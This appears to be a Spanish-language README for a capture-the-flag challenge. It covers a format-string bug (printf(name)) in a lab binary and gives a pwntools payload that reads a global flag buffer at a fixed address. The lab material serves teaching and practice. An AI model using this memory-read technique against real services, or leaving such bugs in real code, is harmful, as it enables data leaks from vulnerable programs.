# ECHO Corp — Format String

| Campo       | Valor                          |
|-------------|--------------------------------|
| Categoría   | PWN                            |
| Dificultad  | Medio                          |
| Técnica     | Format String Vulnerability    |
| Docker      | Sí                             |
| Puertos     | 9999 (nc), 80 (web)            |

## Descripción

El binario `echo` tiene un `printf(name)` sin especificador de formato.
La variable global `flag` se carga al inicio con el contenido de `flag.txt`.
Con PIE deshabilitado, `flag` tiene dirección fija en la sección `.bss`.

## Vulnerabilidad

```c
char flag[64];          // variable global — dirección fija

printf(name);           // FORMAT STRING — sin "%s"
```

## Ataque

```python
from pwn import *

elf  = ELF('./echo')
flag_addr = elf.symbols['flag']   # dirección estática de flag[]

# El buffer 'name' es el primer arg en la pila para printf (x86-64 -O0).
# Buscar el offset con: %1$p %2$p %3$p ... hasta ver parte de la dirección.
# Típicamente el offset es 6 (primer arg en pila = el propio buffer).

OFFSET = 6   # ajustar según el binario compilado

payload = p64(flag_addr) + f'%{OFFSET}$s'.encode()
```

Cuando printf procesa `%OFFSET$s`, toma los 8 bytes al inicio del buffer
(que es el propio `flag_addr`) como puntero y lee el string apuntado → flag.

## Solución rápida

```bash
python3 solve.py REMOTE <host> <port_9999>
```

## Cómo ejecutar

```bash
FLAG="CTF{test_flag}" docker compose up --build
```
